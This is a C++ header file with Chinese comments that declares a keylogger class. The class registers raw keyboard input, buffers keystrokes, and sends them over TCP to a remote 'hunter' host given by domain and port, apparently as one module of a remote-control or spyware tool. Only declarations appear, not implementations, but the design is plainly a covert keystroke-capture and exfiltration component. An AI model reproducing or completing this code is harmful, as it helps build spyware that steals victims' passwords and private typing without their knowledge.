// 通过接收原始输入设备信息
// 获取键盘数据 发送至hunter端

#pragma once
#include "TcpSocket.h"
#include <vector>
class Keybd
{
public:
	Keybd();
	~Keybd();

	// 本类入口函数
	static void startKeybd(std::string domain, int port);

	// 用新线程创建对话框处理原始输入设备消息
	static void createDialogByNewThread();
	static DWORD WINAPI threadProc(LPVOID args);
	static BOOL WINAPI keybdWndProc(HWND hWnd, UINT uiMsg, WPARAM wParam, LPARAM lParam);

	static void CALLBACK sendKeybdData(HWND hWnd, UINT uiMsg, UINT uiTimer, DWORD dwTimer);

	// 更新或删除socket、缓冲区
	static void addSocket(TcpSocket* sock);
	static std::vector<TcpSocket*> getSockets();
	static void delSocket(TcpSocket* sock);
	static void addBuffer(char data);
	static void delBuffer();


	// 注册原始输入设备
	static BOOL regist();
	// 获取输入数据并保存至类缓冲区
	static BOOL getKeybdData(LPARAM lParam);
	// 保存按键信息到类缓冲区
	static void saveKey(USHORT usVKey);
};
